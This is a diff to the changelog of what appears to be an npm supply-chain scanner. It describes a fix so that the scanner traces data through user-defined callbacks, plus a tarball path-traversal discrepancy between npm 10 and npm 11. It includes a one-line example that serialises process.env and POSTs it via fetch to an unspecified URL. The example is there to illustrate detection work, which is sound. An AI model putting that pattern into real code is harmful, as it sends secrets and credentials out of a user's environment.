@@ -970,6 +970,15 @@ aggregate):
 
 ### Fixed
 
+- **Security: data a function hands to a callback it was given is followed (D-19; rule set 2.74.0).**
+  `function withEnv(cb) { cb(JSON.stringify(process.env)); }` then `withEnv((d) => fetch(u, { method: 'POST', body:
+  d }))` sends the whole environment, and a release that did so at import was OK: the supply model's tree, which
+  answers for every file it reads (under 2,000,000 characters), ran a built-in's callback (`forEach`, `then`) with
+  what it was given, but not a callback the script's own function calls. A parameter a function calls with values
+  now runs the function a caller gives there with them: a value the function was given itself is what the caller
+  gives it (`pass(data, cb)` calling `cb(x)`), and a callback handed on to another function carries it
+  (`outer(cb) { inner(cb); }`). The popular set's 1,703 releases: no verdict moved. Across modules the tree follows
+  no such send yet, with a callback or without one (D-7).
 - **Security: an npm tarball npm 10 unpacks otherwise than npm 11 is INCOMPLETE (BR-4, F-14; rule set 2.72.0).**
   The check of an npm tarball against npm's own reading (F-10) followed node-tar 7.5, which npm 11 bundles; npm 10
   (Node 22's) bundles node-tar 6.2, which refuses a `..` part by `/` alone, so on Linux and macOS
